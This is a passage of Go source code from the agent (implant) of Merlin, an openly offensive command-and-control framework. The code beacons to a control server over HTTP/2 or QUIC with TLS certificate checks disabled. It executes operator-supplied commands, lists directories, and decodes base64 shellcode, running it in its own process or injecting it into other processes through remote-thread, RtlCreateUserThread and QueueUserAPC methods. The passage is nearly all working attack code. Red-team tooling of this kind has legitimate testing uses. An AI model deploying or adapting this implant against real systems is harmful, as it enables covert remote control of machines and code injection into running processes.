						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
						message("warn", errPost.Error())
					}
					break
				}
				if resp2.StatusCode != 200 {
					if a.Verbose {
						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
					}
				}
			default:
				if a.Verbose {
					message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
				}
			}
		}
	}
}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
func getClient(protocol string) (*http.Client, error) {

	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	if protocol == "hq" {
		transport := &h2quic.RoundTripper{
			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	} else if protocol == "h2" {
		transport := &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	}
	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
}

func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
	}

	stdout, stderr = ExecuteCommand(j.Command, j.Args)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
}

func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {

	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
	}

	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)

	if errDecode != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
			message("warn", errDecode.Error())
		}
		return errDecode
	}

	if a.Verbose {
		message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))
	}
	if a.Debug {
		message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
	}

	if shellcode.Method == "self" {
		err := ExecuteShellcodeSelf(shellcodeBytes)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "remote" {
		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "rtlcreateuserthread" {
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "userapc" {
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else {
		if a.Verbose {
			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
		}
		return fmt.Errorf("invalid shellcode execution method %s", shellcode.Method)
	}
}

func (a *Agent) agentInfo(host string, client *http.Client) {
	i := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      a.WaitTime.String(),
		PaddingMax:    a.PaddingMax,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Skew:          a.Skew,
		Proto:         a.Proto,
		KillDate:      a.KillDate,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if a.Debug {
			message("warn", "There was an error marshaling the JSON object")
			message("warn", errP.Error())
		}
	}

	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AgentInfo",
		Payload: (*json.RawMessage)(&payload),
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	err := json.NewEncoder(b).Encode(g)
	if err != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error encoding the agentInfo JSON message:\r\n%s", err.Error()))
		}
		return
	}
	if a.Verbose {
		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		a.FailedCheckin++
		if a.Debug {
			message("warn", "There was an error with the HTTP client while performing a POST:")
			message("warn", err.Error())
		}
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return
	}
	if a.Debug {
		message("debug", "HTTP Response:")
		message("warn", fmt.Sprintf("%+v", resp))
	}
	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn", "There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		return
	}
	a.FailedCheckin = 0
}

func (a *Agent) list(path string) (string, error) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))

	} else if a.Verbose {
		message("success", fmt.Sprintf("listing directory contents for: %s", path))
	}

	// Resolve relative path to absolute
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	files, err := ioutil.ReadDir(aPath)

	if err != nil {
		return "", err
	}

	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, f := range files {
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return details, nil
}

// TODO Make a generic function to send a JSON message; Keep basic so protocols can be switched (i.e. DNS)

// TODO centralize this into a package because it is used here and in the server
// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

/*

1. POST System Enumeration Information and receive back JSON object w/ additional instructions
2. Sleep
3. Check in w/ Server
4. Execute commands if provided by server
5. Return results to server
6. Sleep and Check In
*/

// TODO add cert stapling
// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
// TODO send cmdResult for agentcontrol messages
// TODO configure set UserAgent agentcontrol message
